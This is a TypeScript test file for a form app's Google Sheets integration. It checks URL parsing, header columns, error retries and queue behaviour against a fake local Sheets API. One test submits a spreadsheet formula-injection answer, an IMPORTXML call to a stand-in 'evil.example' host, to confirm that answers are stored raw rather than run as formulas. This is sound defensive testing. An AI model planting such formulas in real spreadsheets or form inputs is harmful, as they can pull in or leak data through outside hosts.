import { FieldKindEnum } from '@heyform-inc/shared-types-enums'
import { BadRequestException } from '@nestjs/common'
import * as assert from 'assert'
import * as http from 'http'
import { AddressInfo } from 'net'

import { validateAppConfig } from '../src/apps/validate-config'

import {
  columnLetter,
  createGoogleSheetsApp,
  parseSpreadsheetId,
  spreadsheetUrl
} from '../src/apps/googlesheets'
import { loadSettingOptions } from '../src/apps/load-options'
import { AppError } from '../src/apps/types'
import { IntegrationQueue } from '../src/queue/integration-queue'

// --- fake Google Sheets API ----------------------------------------------------

interface FakeTab {
  sheetId: number
  title: string
  columnCount: number
  rows: Array<Array<string | number>>
}

interface FakeRequest {
  method: string
  path: string
  query: URLSearchParams
  body: any
  authorization?: string
}

const SPREADSHEET_ID = '1AbCdEfGhIjKlMnOpQrStUvWxYz0123456789_-abc'

function letterIndex(letters: string): number {
  return [...letters].reduce((n, letter) => n * 26 + letter.charCodeAt(0) - 64, 0) - 1
}

class FakeSheets {
  spreadsheets = new Map<string, { title: string; tabs: FakeTab[] }>()
  requests: FakeRequest[] = []
  // Answers the next request with this error instead
  failures: Array<{ status: number; body: unknown }> = []
  private nextId = 1
  private server = http.createServer((req, res) => {
    let raw = ''
    req.on('data', chunk => (raw += chunk))
    req.on('end', () => {
      const url = new URL(req.url ?? '', 'http://fake')
      const request: FakeRequest = {
        method: req.method ?? 'GET',
        path: decodeURIComponent(url.pathname),
        query: url.searchParams,
        body: raw ? JSON.parse(raw) : undefined,
        authorization: req.headers.authorization
      }
      this.requests.push(request)

      const failure = this.failures.shift()
      const { status, body } = failure ?? this.handle(request)
      res.writeHead(status, { 'content-type': 'application/json' })
      res.end(JSON.stringify(body))
    })
  })

  async start() {
    await new Promise<void>(resolve => this.server.listen(0, '127.0.0.1', resolve))
  }

  async stop() {
    await new Promise(resolve => this.server.close(resolve))
  }

  get apiUrl() {
    return `http://127.0.0.1:${(this.server.address() as AddressInfo).port}/v4/spreadsheets`
  }

  reset() {
    this.spreadsheets.clear()
    this.requests = []
    this.failures = []
  }

  add(tabs: Array<Partial<FakeTab> & { title: string }>, id = SPREADSHEET_ID) {
    this.spreadsheets.set(id, {
      title: 'Existing',
      tabs: tabs.map((tab, index) => ({ sheetId: index * 100, columnCount: 26, rows: [], ...tab }))
    })
    return this.spreadsheets.get(id)!
  }

  tab(title = 'Sheet1', id = SPREADSHEET_ID) {
    return this.spreadsheets.get(id)!.tabs.find(tab => tab.title === title)!
  }

  private properties(tabs: FakeTab[]) {
    return tabs.map(tab => ({
      properties: {
        sheetId: tab.sheetId,
        title: tab.title,
        gridProperties: { columnCount: tab.columnCount }
      }
    }))
  }

  private findRange(spreadsheet: { tabs: FakeTab[] }, range: string) {
    const match = range.match(/^'((?:[^']|'')*)'!(.+)$/)
    const tab = match && spreadsheet.tabs.find(row => row.title === match[1].replace(/''/g, "'"))
    return tab ? { tab, cells: match![2] } : undefined
  }

  private handle({ method, path, query, body }: FakeRequest): { status: number; body: unknown } {
    const rest = path.replace(/^\/v4\/spreadsheets\/?/, '')

    if (method === 'POST' && rest === '') {
      const id = `created${this.nextId++}`.padEnd(30, 'x')
      const tabs = [{ sheetId: 0, title: 'Sheet1', columnCount: 26, rows: [] }]
      this.spreadsheets.set(id, { title: body.properties.title, tabs })
      return { status: 200, body: { spreadsheetId: id, sheets: this.properties(tabs) } }
    }

    const [, id, action] = rest.match(/^([^/:]+)(.*)$/) ?? []
    const spreadsheet = this.spreadsheets.get(id)

    if (!spreadsheet) {
      return {
        status: 404,
        body: { error: { code: 404, message: 'Requested entity was not found.' } }
      }
    }

    if (method === 'GET' && action === '') {
      return { status: 200, body: { sheets: this.properties(spreadsheet.tabs) } }
    }

    if (method === 'POST' && action === ':batchUpdate') {
      for (const request of body.requests) {
        const tab = spreadsheet.tabs.find(row => row.sheetId === request.appendDimension.sheetId)!
        tab.columnCount += request.appendDimension.length
      }
      return { status: 200, body: {} }
    }

    const values = action.match(/^\/values\/(.+?)(:append)?$/)
    const found = values && this.findRange(spreadsheet, values[1])

    if (!found) {
      return { status: 400, body: { error: { message: `Unable to parse range: ${values?.[1]}` } } }
    }

    const { tab, cells } = found

    if (method === 'GET' && cells === '1:1') {
      return { status: 200, body: tab.rows[0] ? { values: [tab.rows[0]] } : {} }
    }

    if (method === 'PUT') {
      const [, from, to] = cells.match(/^([A-Z]+)1:([A-Z]+)1$/)!

      if (letterIndex(to) >= tab.columnCount) {
        return { status: 400, body: { error: { message: 'Range exceeds grid limits' } } }
      }

      const header = (tab.rows[0] ??= [])
      body.values[0].forEach((value: string, offset: number) => {
        header[letterIndex(from) + offset] = value
      })
      return { status: 200, body: {} }
    }

    if (method === 'POST' && values![2] && cells === 'A1') {
      const row = body.values[0]

      if (row.length > tab.columnCount) {
        return { status: 400, body: { error: { message: 'Range exceeds grid limits' } } }
      }

      tab.rows.push(row)
      return { status: 200, body: {} }
    }

    return { status: 400, body: { error: { message: `Unexpected ${method} ${path}` } } }
  }
}

const sheets = new FakeSheets()
let app: ReturnType<typeof createGoogleSheetsApp>

const AUTH = { type: 'oauth2' as const, accessToken: 'access-1' }

const FORM: any = {
  id: 'form_1',
  name: 'Event signup',
  fields: [
    { id: 'welcome', kind: FieldKindEnum.WELCOME, title: 'Welcome' },
    { id: 'name', kind: FieldKindEnum.SHORT_TEXT, title: 'Name' },
    {
      id: 'meals',
      kind: FieldKindEnum.MULTIPLE_CHOICE,
      title: ['Meals ', ['b', ['Choose any']]],
      properties: {
        choices: [
          { id: 'veg', label: 'Vegetarian' },
          { id: 'fish', label: 'Fish' }
        ]
      }
    },
    { id: 'guests', kind: FieldKindEnum.NUMBER, title: 'Guests' }
  ]
}

function createSubmission(id: string, answers: Record<string, unknown>, fields = FORM.fields) {
  return {
    id,
    endAt: 1792764309, // 2026-10-23 14:05:09 UTC
    answers: Object.entries(answers).map(([fieldId, value]) => {
      const field = fields.find((row: any) => row.id === fieldId)
      return {
        id: fieldId,
        kind: field.kind,
        title: field.title,
        properties: field.properties,
        value
      }
    })
  } as any
}

function deliver(
  submission: any,
  config: any = { spreadsheet: spreadsheetUrl(SPREADSHEET_ID), sheet: '0' },
  form = FORM
) {
  return app.run({ auth: AUTH, config, form, submission })
}

async function assertBadRequest(promise: Promise<unknown>, message: RegExp) {
  await assert.rejects(promise, (error: any) => {
    assert.ok(error instanceof BadRequestException, `expected BadRequestException, got ${error}`)
    assert.match(error.message, message)
    return true
  })
}

async function assertAppError(promise: Promise<unknown>, message: RegExp, retryable: boolean) {
  await assert.rejects(promise, (error: any) => {
    assert.ok(error instanceof AppError, `expected AppError, got ${error}`)
    assert.match(error.message, message)
    assert.strictEqual(error.retryable, retryable)
    return true
  })
}

function save(config: Record<string, unknown>, form = FORM) {
  return validateAppConfig(app, config, { form, withAuth: fn => fn(AUTH) })
}

// --- parsing ------------------------------------------------------------------

function testParsesSpreadsheetUrlsAndIds() {
  for (const input of [
    `https://docs.google.com/spreadsheets/d/${SPREADSHEET_ID}/edit#gid=0`,
    `https://docs.google.com/spreadsheets/d/${SPREADSHEET_ID}`,
    `https://docs.google.com/spreadsheets/u/1/d/${SPREADSHEET_ID}/edit?usp=sharing`,
    `  ${SPREADSHEET_ID}  `
  ]) {
    assert.strictEqual(parseSpreadsheetId(input), SPREADSHEET_ID, input)
  }

  for (const input of [
    `https://evil.example/spreadsheets/d/${SPREADSHEET_ID}/edit`,
    'https://docs.google.com/document/d/1AbCdEfGhIjKlMnOpQrStUvWxYz/edit',
    'not a spreadsheet',
    'short',
    '',
    undefined,
    42
  ]) {
    assert.strictEqual(parseSpreadsheetId(input), undefined, String(input))
  }

  assert.deepStrictEqual([0, 25, 26, 51, 701, 702].map(columnLetter), [
    'A',
    'Z',
    'AA',
    'AZ',
    'ZZ',
    'AAA'
  ])
}

// --- choosing the spreadsheet -----------------------------------------------------

async function testCreatesASpreadsheetNamedAfterTheForm() {
  sheets.reset()

  // The URL is hidden, so not required
  const config = await save({ createSpreadsheet: true })
  const [id] = [...sheets.spreadsheets.keys()]

  assert.strictEqual(sheets.spreadsheets.get(id)!.title, 'Event signup')
  assert.deepStrictEqual(config, {
    createSpreadsheet: false,
    spreadsheet: spreadsheetUrl(id),
    sheet: '0'
  })
  assert.strictEqual(sheets.requests[0].authorization, 'Bearer access-1')
}

async function testNormalisesAnExistingSpreadsheet() {
  sheets.reset()
  sheets.add([{ title: 'Responses' }, { title: 'Archive' }])

  // A pasted URL is stored in one form, and a blank tab is the first one
  assert.deepStrictEqual(
    await save({
      spreadsheet: `https://docs.google.com/spreadsheets/u/0/d/${SPREADSHEET_ID}/edit#gid=100`
    }),
    { createSpreadsheet: false, spreadsheet: spreadsheetUrl(SPREADSHEET_ID), sheet: '0' }
  )
  assert.deepStrictEqual(await save({ spreadsheet: SPREADSHEET_ID, sheet: '100' }), {
    createSpreadsheet: false,
    spreadsheet: spreadsheetUrl(SPREADSHEET_ID),
    sheet: '100'
  })
  assert.strictEqual(sheets.spreadsheets.size, 1, 'nothing created')
}

async function testValidationErrorsAreClear() {
  sheets.reset()
  sheets.add([{ title: 'Responses' }])

  await assertBadRequest(save({}), /Spreadsheet URL is required/)
  await assertBadRequest(
    save({ spreadsheet: 'https://example.com/sheet' }),
    /must be the URL or ID of a Google Sheets spreadsheet/
  )
  await assertBadRequest(
    save({ spreadsheet: SPREADSHEET_ID, sheet: '999' }),
    /tab wasn't found in this spreadsheet/
  )
  await assertBadRequest(save({ spreadsheet: 'a'.repeat(44) }), /spreadsheet wasn't found/)

  sheets.failures.push({
    status: 403,
    body: {
      error: {
        code: 403,
        message: 'The caller does not have permission',
        status: 'PERMISSION_DENIED'
      }
    }
  })
  await assertBadRequest(save({ spreadsheet: SPREADSHEET_ID }), /can't edit this spreadsheet/)

  sheets.failures.push({
    status: 403,
    body: { error: { status: 'PERMISSION_DENIED', details: [{ reason: 'SERVICE_DISABLED' }] } }
  })
  await assertBadRequest(save({ spreadsheet: SPREADSHEET_ID }), /Sheets API isn't enabled/)
}

async function testListsTabsForTheSpreadsheet() {
  sheets.reset()
  sheets.add([{ title: 'Responses' }, { title: "Team's" }])
  const load = (config: Record<string, unknown>) =>
    loadSettingOptions(app, 'sheet', config, fn => fn(AUTH))

  assert.deepStrictEqual(
    await load({ spreadsheet: spreadsheetUrl(SPREADSHEET_ID), unknown: 'x' }),
    [
      { label: 'Responses', value: '0' },
      { label: "Team's", value: '100' }
    ]
  )
  await assertBadRequest(load({ spreadsheet: 'nope' }), /URL or ID of a Google Sheets spreadsheet/)
  await assertBadRequest(load({ spreadsheet: 'b'.repeat(44) }), /spreadsheet wasn't found/)
}

// --- delivering ------------------------------------------------------------------

async function testFirstDeliveryWritesTheHeaderRow() {
  sheets.reset()
  sheets.add([{ title: 'Sheet1' }])

  await deliver(
    createSubmission('sub_1', { name: 'Ann', meals: { value: ['veg', 'fish'] }, guests: 2 })
  )

  assert.deepStrictEqual(sheets.tab().rows, [
    ['Submitted at', 'Submission ID', 'Name', 'Meals Choose any', 'Guests'],
    ['2026-10-23 14:05:09 UTC', 'sub_1', 'Ann', 'Vegetarian, Fish', 2]
  ])

  // Then only the row is added
  await deliver(createSubmission('sub_2', { name: 'Ben' }))
  assert.deepStrictEqual(sheets.tab().rows[2], ['2026-10-23 14:05:09 UTC', 'sub_2', 'Ben', '', ''])
  assert.strictEqual(sheets.requests.filter(r => r.method === 'PUT').length, 1)
}

async function testAnswersGoUnderTheirHeaderWhateverTheOrder() {
  sheets.reset()
  sheets.add([{ title: 'Sheet1' }])
  // The owner moved the columns around and added their own
  sheets
    .tab()
    .rows.push(['Guests', 'Notes', 'Submission ID', 'Name', 'Meals Choose any', 'Submitted at'])

  await deliver(createSubmission('sub_1', { name: 'Ann', guests: 3 }))

  assert.deepStrictEqual(sheets.tab().rows[1], [
    3,
    '',
    'sub_1',
    'Ann',
    '',
    '2026-10-23 14:05:09 UTC'
  ])
  assert.strictEqual(sheets.tab().rows[0].length, 6, 'no header added')
}

async function testNewAndRenamedQuestionsGetNewColumns() {
  sheets.reset()
  sheets.add([{ title: 'Sheet1' }])
  await deliver(createSubmission('sub_1', { name: 'Ann', guests: 1 }))

  const fields = [
    ...FORM.fields.map((field: any) =>
      field.id === 'name' ? { ...field, title: 'Full name' } : field
    ),
    { id: 'email', kind: FieldKindEnum.EMAIL, title: 'Email' }
  ]
  await deliver(
    createSubmission('sub_2', { name: 'Ben', email: 'ben@example.com', guests: 2 }, fields),
    undefined,
    { ...FORM, fields }
  )

  assert.deepStrictEqual(sheets.tab().rows, [
    ['Submitted at', 'Submission ID', 'Name', 'Meals Choose any', 'Guests', 'Full name', 'Email'],
    ['2026-10-23 14:05:09 UTC', 'sub_1', 'Ann', '', 1],
    ['2026-10-23 14:05:09 UTC', 'sub_2', '', '', 2, 'Ben', 'ben@example.com']
  ])
}

async function testRepeatedTitlesAndWideFormsFit() {
  sheets.reset()
  sheets.add([{ title: 'Sheet1', columnCount: 3 }])
  const fields = [
    { id: 'q1', kind: FieldKindEnum.SHORT_TEXT, title: 'Name' },
    { id: 'q2', kind: FieldKindEnum.SHORT_TEXT, title: 'Name' },
    { id: 'q3', kind: FieldKindEnum.SHORT_TEXT, title: '' }
  ]

  await deliver(createSubmission('sub_1', { q1: 'a', q2: 'b', q3: 'c' }, fields), undefined, {
    ...FORM,
    fields
  })

  assert.deepStrictEqual(sheets.tab().rows[0], [
    'Submitted at',
    'Submission ID',
    'Name',
    'Name (2)',
    'Untitled question'
  ])
  assert.strictEqual(sheets.tab().columnCount, 5, 'columns added to fit the header')
}

async function testAnswersAreWrittenRaw() {
  sheets.reset()
  sheets.add([{ title: "Team's tab" }])

  await deliver(createSubmission('sub_1', { name: '=IMPORTXML("https://evil.example", "//a")' }), {
    spreadsheet: SPREADSHEET_ID,
    sheet: '0'
  })

  const writes = sheets.requests.filter(r => r.method !== 'GET')
  assert.deepStrictEqual(
    writes.map(r => r.query.get('valueInputOption')),
    ['RAW', 'RAW'],
    'header and row are stored as typed, never as formulas'
  )
  assert.strictEqual(
    sheets.tab("Team's tab").rows[1][2],
    '=IMPORTXML("https://evil.example", "//a")'
  )
}

async function testFailuresSayWhetherToRetry() {
  sheets.reset()
  sheets.add([{ title: 'Sheet1' }])
  const submission = createSubmission('sub_1', { name: 'Ann' })

  sheets.failures.push({ status: 429, body: { error: { status: 'RESOURCE_EXHAUSTED' } } })
  await assertAppError(deliver(submission), /rate limit/, true)

  sheets.failures.push({ status: 503, body: {} })
  await assertAppError(deliver(submission), /unavailable \(HTTP 503\)/, true)

  sheets.failures.push({ status: 403, body: { error: { status: 'PERMISSION_DENIED' } } })
  await assertAppError(deliver(submission), /can't edit this spreadsheet/, false)

  await assertAppError(
    deliver(submission, { spreadsheet: 'c'.repeat(44), sheet: '0' }),
    /spreadsheet wasn't found/,
    false
  )
  await assertAppError(
    deliver(submission, { spreadsheet: SPREADSHEET_ID, sheet: '999' }),
    /tab picked in the settings no longer exists/,
    false
  )

  sheets.failures.push({ status: 401, body: {} })
  await assert.rejects(deliver(submission), (error: any) => error.unauthorized === true)

  assert.strictEqual(sheets.tab().rows.length, 0, 'nothing written')
}

async function testQueueRetriesOnlyWhatCanSucceed() {
  sheets.reset()
  sheets.add([{ title: 'Sheet1' }])
  const records: any[] = []
  const queue = new IntegrationQueue(
    { findById: () => app } as any,
    {
      findById: async () => ({
        id: 'integration_1',
        status: 1,
        config: { spreadsheet: SPREADSHEET_ID, sheet: '0' }
      }),
      addRecord: async (record: any) => records.push(record)
    } as any,
    { withRunAuth: async (_app: any, _integration: any, fn: any) => fn(AUTH) } as any,
    { findById: async () => createSubmission('sub_1', { name: 'Ann' }) } as any,
    { findById: async () => FORM } as any
  )
  const createJob = () => {
    const job: any = {
      id: 1,
      attemptsMade: 0,
      opts: { attempts: 5 },
      discarded: false,
      data: {
        appId: 'googlesheets',
        integrationId: 'integration_1',
        formId: 'form_1',
        submissionId: 'sub_1'
      },
      discard: async () => {
        job.discarded = true
      }
    }
    return job
  }

  const limited = createJob()
  sheets.failures.push({ status: 429, body: {} })
  const rateLimit = await queue.process(limited).catch(error => error)
  limited.attemptsMade = 1
  await queue.recordFailure(limited, rateLimit)
  assert.strictEqual(limited.discarded, false)
  assert.strictEqual(records[0].willRetry, true)

  const denied = createJob()
  sheets.failures.push({ status: 403, body: {} })
  const forbidden = await queue.process(denied).catch(error => error)
  denied.attemptsMade = 1
  await queue.recordFailure(denied, forbidden)
  assert.strictEqual(denied.discarded, true, 'no further attempts')
  assert.strictEqual(records[1].willRetry, false)
  assert.match(records[1].error, /can't edit this spreadsheet/)

  await queue.process(createJob())
  assert.strictEqual(sheets.tab().rows.length, 2)
}

function testDefinition() {
  assert.strictEqual(app.id, 'googlesheets')
  assert.deepStrictEqual(app.auth, {
    type: 'oauth2',
    provider: 'google',
    scopes: ['https://www.googleapis.com/auth/spreadsheets']
  })
  assert.deepStrictEqual(app.queue, {
    attempts: 5,
    backoff: { type: 'exponential', delay: 10_000 },
    timeout: 60_000
  })
}

async function run() {
  await sheets.start()
  app = createGoogleSheetsApp(sheets.apiUrl)

  try {
    testDefinition()
    testParsesSpreadsheetUrlsAndIds()
    await testCreatesASpreadsheetNamedAfterTheForm()
    await testNormalisesAnExistingSpreadsheet()
    await testValidationErrorsAreClear()
    await testListsTabsForTheSpreadsheet()
    await testFirstDeliveryWritesTheHeaderRow()
    await testAnswersGoUnderTheirHeaderWhateverTheOrder()
    await testNewAndRenamedQuestionsGetNewColumns()
    await testRepeatedTitlesAndWideFormsFit()
    await testAnswersAreWrittenRaw()
    await testFailuresSayWhetherToRetry()
    await testQueueRetriesOnlyWhatCanSucceed()
  } finally {
    await sheets.stop()
  }
}

if (require.main === module) {
  run().catch(error => {
    process.stderr.write(`${error instanceof Error ? (error.stack ?? error.message) : error}\n`)
    process.exitCode = 1
  })
}
